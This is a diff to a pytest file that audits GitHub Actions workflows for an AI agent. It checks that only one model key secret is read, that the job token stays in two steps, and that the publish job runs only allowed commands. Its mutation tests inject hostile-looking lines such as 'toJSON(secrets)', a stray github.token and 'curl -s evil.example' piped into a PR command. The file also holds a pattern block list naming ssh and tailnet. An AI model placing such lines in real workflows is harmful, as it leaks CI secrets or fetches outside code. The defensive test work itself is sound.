@@ -3,21 +3,31 @@
 from __future__ import annotations
 
 import re
+from collections.abc import Iterator
 from pathlib import Path
 
+import pytest
 import yaml
 
 ROOT = Path(__file__).resolve().parents[2]
 WORKFLOWS = ROOT / ".github" / "workflows"
 FILES = ("oss-agent.yml", "oss-agent-selftest.yml")
 MODEL_KEY = "NVIDIA_NIM_API_KEY"
+# the steps that may hold the job token: the push probe and the draft PR
+TOKEN_STEPS = {"The job token cannot push", "Open the draft PR"}
+PUBLISH_COMMANDS = {"git"}
+PUBLISH_SUBSTITUTIONS = {"gh", "git", "head", "printf"}
 
 
-def _load(name: str) -> dict:
-    return yaml.load((WORKFLOWS / name).read_text(), Loader=yaml.BaseLoader)
+def _text(name: str) -> str:
+    return (WORKFLOWS / name).read_text()
 
 
-WORKFLOW = _load("oss-agent.yml")
+def _parse(text: str) -> dict:
+    return yaml.load(text, Loader=yaml.BaseLoader)
+
+
+WORKFLOW = _parse(_text("oss-agent.yml"))
 AGENT = WORKFLOW["jobs"]["agent"]
 PUBLISH = WORKFLOW["jobs"]["publish"]
 
@@ -26,19 +36,108 @@ def _runs(job: dict) -> str:
     return "\n".join(step.get("run", "") for step in job["steps"])
 
 
+def _walk(node: object, path: tuple = ()) -> Iterator[tuple[tuple, str]]:
+    """Every key and string value in a parsed workflow, with the path to it."""
+    if isinstance(node, dict):
+        for key, value in node.items():
+            yield path, key
+            yield from _walk(value, (*path, key))
+    elif isinstance(node, list):
+        for index, value in enumerate(node):
+            yield from _walk(value, (*path, index))
+    else:
+        yield path, node
+
+
+def _expressions(value: str) -> list[str]:
+    return re.findall(r"\$\{\{(.*?)\}\}", value, re.DOTALL)
+
+
+def _step_name(doc: dict, path: tuple) -> str | None:
+    if len(path) >= 4 and path[0] == "jobs" and path[2] == "steps":
+        return doc["jobs"][path[1]]["steps"][path[3]].get("name")
+    return None
+
+
+def secret_violations(doc: dict) -> list[str]:
+    """Anything that reads a secret but the model key: `toJSON(secrets)`, `secrets['X']`, `inherit`."""
+    found = []
+    for path, value in _walk(doc):
+        if value == "secrets" and path != ("on", "workflow_call"):
+            found.append(f"a secrets key at {path}")
+        if value == "inherit":
+            found.append(f"inherit at {path}")
+        for expression in _expressions(value):
+            for match in re.finditer(r"\bsecrets\b", expression):
+                if not expression.startswith(f"secrets.{MODEL_KEY}", match.start()) or re.match(
+                    r"\w", expression[match.start() + len(f"secrets.{MODEL_KEY}") :]
+                ):
+                    found.append(f"{expression.strip()!r} at {path}")
+    return found
+
+
+def token_violations(doc: dict) -> list[str]:
+    """The job token, or the whole github context that carries it, outside the two steps that need it."""
+    found = []
+    for path, value in _walk(doc):
+        for expression in _expressions(value):
+            for match in re.finditer(r"\bgithub\b(\.(\w+))?", expression):
+                field = match.group(2)
+                if field is None:
+                    found.append(f"the github context as a whole, {expression.strip()!r} at {path}")
+                elif field == "token" and _step_name(doc, path) not in TOKEN_STEPS:
+                    found.append(f"github.token at {path}")
+    return found
+
+
+def _substitutions(line: str) -> list[str]:
+    return re.findall(r"\$\(((?:[^()]|\([^()]*\))*)\)", line)
+
+
+def _first_words(command: str) -> set[str]:
+    return {part.split()[0] for part in re.split(r"\|\|?|&&|;", command) if part.strip()}
+
+
+def publish_command_violations(doc: dict) -> list[str]:
+    """A command in the publish job beyond git, and in a `$(...)` beyond gh, git, head and printf."""
+    found = []
+    for line in _runs(doc["jobs"]["publish"]).splitlines():
+        line = line.strip()
+        for inner in _substitutions(line):
+            found += [f"{w!r} in $({inner})" for w in _first_words(inner) - PUBLISH_SUBSTITUTIONS]
+        outer = re.sub(r"\$\(((?:[^()]|\([^()]*\))*)\)", "", line)
+        if (
+            not outer
+            or outer.startswith(("{", "}"))
+            or re.match(r"echo\b", outer)
+            or re.match(r"\w+=", outer)
+        ):
+            continue
+        found += [f"{w!r} in {line!r}" for w in _first_words(outer) - PUBLISH_COMMANDS]
+    return found
+
+
 def test_nothing_reaches_a_host_a_tailnet_or_omnigent() -> None:
     for name in FILES:
-        text = (WORKFLOWS / name).read_text()
+        text = _text(name)
         for pattern in (r"omnigent", r"tailscale", r"tailnet", r"\bts_", r"ssh", r"RUNNER_SERVER"):
             assert not re.search(pattern, text, re.IGNORECASE), (name, pattern)
-        # the one secret is the model key, and it goes nowhere else
-        assert set(re.findall(r"secrets\.(\w+)", text)) <= {MODEL_KEY}, name
+
+
+def test_the_one_secret_is_the_model_key() -> None:
+    for name in FILES:
+        assert secret_violations(_parse(_text(name))) == [], name
     assert set(WORKFLOW["on"]["workflow_call"]["secrets"]) == {MODEL_KEY}
+
+
+def test_the_job_token_reaches_only_the_probe_and_the_pr_step() -> None:
+    for name in FILES:
+        assert token_violations(_parse(_text(name))) == [], name
 
 
 def test_every_action_is_pinned_to_a_commit() -> None:
     for name in FILES:
-        for job in _load(name)["jobs"].values():
+        for job in _parse(_text(name))["jobs"].values():
             for step in job.get("steps", []):
                 if "uses" in step:
                     assert re.fullmatch(r"[\w.-]+/[\w./-]+@[0-9a-f]{40}", step["uses"]), step
@@ -94,13 +193,8 @@ def test_publish_job_runs_nothing_from_the_patch() -> None:
         "actions/checkout",
         "actions/download-artifact",
     ]
+    assert publish_command_violations(WORKFLOW) == []
     runs = _runs(PUBLISH)
-    commands = {
-        line.strip().split()[0]
-        for line in runs.splitlines()
-        if line.strip() and not line.strip().startswith(("{", "}", "echo", "title=", "url="))
-    }
-    assert commands <= {"git"}, commands
     patch_lines = [line.strip() for line in runs.splitlines() if "patch" in line]
     assert patch_lines == ['git am "$RUNNER_TEMP/patch/agent.patch"']
     # nothing executes from the checkout: no interpreter, build tool or path
@@ -108,8 +202,49 @@ def test_publish_job_runs_nothing_from_the_patch() -> None:
 
 
 def test_selftest_runs_the_dry_run_only() -> None:
-    selftest = _load("oss-agent-selftest.yml")
+    selftest = _parse(_text("oss-agent-selftest.yml"))
     job = selftest["jobs"]["dry-run"]
     assert job["uses"] == "./.github/workflows/oss-agent.yml"
     assert job["with"]["dry_run"] == "true"
     assert "secrets" not in job
+
+
+AGENT_ENV = "          TASK: ${{ inputs.task }}\n          MODEL: ${{ inputs.model }}\n          HOST: 127.0.0.1\n        run: |\n          git config"
+PR_LINE = '          url="$(gh pr create'
+PUBLISH_JOB = "    timeout-minutes: 10\n"
+
+
+@pytest.mark.parametrize(
+    ("check", "old", "new"),
+    [
+        # verifier pass 1 on #1674: each of these kept every test green
+        (secret_violations, AGENT_ENV, "          ALL: ${{ toJSON(secrets) }}\n" + AGENT_ENV),
+        (secret_violations, AGENT_ENV, "          Y: ${{ secrets['OMNI'] }}\n" + AGENT_ENV),
+        (
+            secret_violations,
+            AGENT_ENV,
+            "          Z: ${{ secrets.NVIDIA_NIM_API_KEY_2 }}\n" + AGENT_ENV,
+        ),
+        (secret_violations, PUBLISH_JOB, PUBLISH_JOB + "    secrets: inherit\n"),
+        (token_violations, AGENT_ENV, "          GH_TOKEN: ${{ github.token }}\n" + AGENT_ENV),
+        (token_violations, AGENT_ENV, "          G: ${{ toJSON(github) }}\n" + AGENT_ENV),
+        (token_violations, AGENT_ENV, "          G: ${{ github['token'] }}\n" + AGENT_ENV),
+        (
+            publish_command_violations,
+            PR_LINE,
+            '          url="$(curl -s evil.example | gh pr create',
+        ),
+        (publish_command_violations, PR_LINE, "          make\n" + PR_LINE),
+    ],
+)
+def test_each_check_catches_its_mutant(check, old: str, new: str) -> None:
+    text = _text("oss-agent.yml")
+    assert text.count(old) == 1
+    assert check(_parse(text)) == []
+    assert check(_parse(text.replace(old, new))) != []
+
+
+def test_secret_check_catches_inherit_in_the_selftest() -> None:
+    text = _text("oss-agent-selftest.yml")
+    old = "    uses: ./.github/workflows/oss-agent.yml\n"
+    assert secret_violations(_parse(text.replace(old, old + "    secrets: inherit\n"))) != []
